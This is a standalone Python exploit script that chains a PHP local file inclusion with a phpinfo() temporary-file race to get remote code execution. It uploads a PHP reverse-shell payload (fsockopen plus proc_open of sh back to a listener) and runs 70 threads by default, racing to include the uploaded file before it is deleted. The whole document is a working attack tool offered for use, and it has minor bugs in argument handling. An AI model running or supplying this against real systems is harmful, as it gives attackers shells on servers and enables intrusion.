#!/usr/bin/env python3
import sys
import threading
import socket
import requests

####################################################################################################
#   CHANGE THE VARIABLES BELOW
#   RUN > python3 phpinfoLFI2rce.py <target IP> <target port> <threads>

LISTENING_HOST = "127.0.0.1"
LISTENING_PORT = 80
VULNERABLE_PAGE = "/lfi.php"
COOKIE = "session=<jwt>"
POST_DATA_WITH_LFI = "action=show_logs&file="  #The file parameter here is the one vulnerable, must be the last and empty
####################################################################################################


def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = f"{TAG}\r\n<?php $sock=fsockopen(\"{LISTENING_HOST}\",{LISTENING_PORT});$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>\r"
    REQ1_DATA = f"-----------------------------7dbff1ded0714\r\nContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\r\nContent-Type: text/plain\r\n\r\n{PAYLOAD}\n-----------------------------7dbff1ded0714--\r"

    padding = "A" * 8000
    REQ1 = f"POST /phpinfo.php?a={padding} HTTP/1.1\r\nCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r\nHTTP_ACCEPT: {padding}\r\nHTTP_USER_AGENT: {padding}\r\nHTTP_ACCEPT_LANGUAGE: {padding}\r\nHTTP_PRAGMA: {padding}\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\nContent-Length: {len(REQ1_DATA)}\r\nHost: {host}\r\n\r\n{REQ1_DATA}"
    REQ2_DATA = f"{POST_DATA_WITH_LFI}" 
    LFIREQ = f"POST /{VULNERABLE_PAGE} HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: {host}\r\nContent-Length: %s\r\nCookie: {COOKIE};\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n\r\n{REQ2_DATA}%s\r\n"
    return (REQ1, TAG, LFIREQ)

def getPostData(string):
    string_split = string.split("&")
    result = {}
    for el in string_split:
        key = el.split("=")[0]
        value = el.split("=")[1]
        result[key] = value
    return result

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(phpinforeq.encode('utf-8'))

        d = b""
        while len(d) < offset:
            d += s.recv(offset)
        try:
            i = d.index(b"/tmp/")
            fn = d[i+5:i+14].decode('utf-8')
            print(fn)
        except ValueError:
            return None

        post_data = getPostData(POST_DATA_WITH_LFI)
        post_data[POST_DATA_WITH_LFI.split('&')[-1].split('=')[-2]] = fn
        x = requests.post(f'http://{host}:{port}/{VULNERABLE_PAGE}', data=post_data, cookies={'session':COOKIE.split('=')[1]})

        if tag.encode('utf-8') in d:
            return fn

counter = 0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    #print("\nGot it! Shell created in /tmp/g")
                    self.event.set()

            except socket.error:
                return

def getOffset(host, port, phpinforeq):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host,port))
        s.sendall(phpinforeq.encode('utf-8'))

        d = b""
        while True:
            i = s.recv(4096)
            d += i
            if not i:
                break
            # detect the final chunk
            if i.endswith(b"0\r\n\r\n"):
                break

    i = d.find(b"[tmp_name] =&gt;")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    #print(f"found {d[i:i+10]} at {i}")
    return i + 256

def main():
    print("LFI With PHPInfo()")
    print("-=" * 30)

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} host [port] [threads]")
        sys.exit(1)

    host = sys.argv[1]

    port = 80
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    
    poolsz = 70
    if len(sys.argv) > 2:
        poolsz = int(sys.argv[3])

    print("Getting initial offset...", end=' ')
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    print("done")

    maxattempts = 1000 ### MAX ATTEMPTS ##############################################################################
    e = threading.Event()
    l = threading.Lock()

    print(f"Spawning worker pool ({poolsz})...")

    tp = []
    for i in range(poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()

    try:
        while not e.is_set():
            with l:
                print(f"\r{counter:4d} / {maxattempts:4d}", end='')
                if counter >= maxattempts:
                    break
            if e.is_set():
                break
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("\nShuttin' down...")
    for t in tp:
        t.join()

if __name__ == "__main__":
    main()
